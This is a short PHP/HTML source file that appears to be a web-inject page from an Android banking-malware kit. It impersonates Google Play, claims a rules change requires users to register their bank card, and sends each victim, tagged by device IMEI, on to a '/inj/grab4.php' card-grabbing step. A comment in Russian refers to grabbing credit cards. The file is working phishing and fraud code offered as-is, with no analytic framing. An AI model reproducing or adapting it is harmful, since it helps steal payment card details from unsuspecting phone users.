<!DOCTYPE html><html><head><meta charset="utf-8"/>
<title>some</title>
<meta name="viewport"content="width=device-width, initial-scale=1">
<link rel="stylesheet"href="css/bootstrap.css"type="text/css"media="all"/>
</head>
<body>


<?php



	    $IMEI = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
		
		//$IM = "321";
		//$country = "us";
		//$IMEI = "$IM|$country|Грабинг СС";
			
?>
<center><img src="http://www.ixbt.com/short/images/2016/Jul/google_play_logo_2015-630x247.png"style="width:80%"class=""/></center>
<?php
echo "<form action=\"/inj/grab4.php?p=$IMEI\" method=\"post\">";
		echo "<h3><p class=\"text-muted\"><center>Welcome to Google</br>
		<small>In connection with the change in the rules for use \"Google Play\", you need to register your bank card in our system</br>
		Registration takes less than two minutes to continue registration, click \"Continue\"</br></br></center></p></small></h3>";
?>
<center><input type="submit" id="goo" value="Continue" name="goo" class="btn btn-success mb" style="margin-top: 10px;"/></center>

</form>

</body>
</html>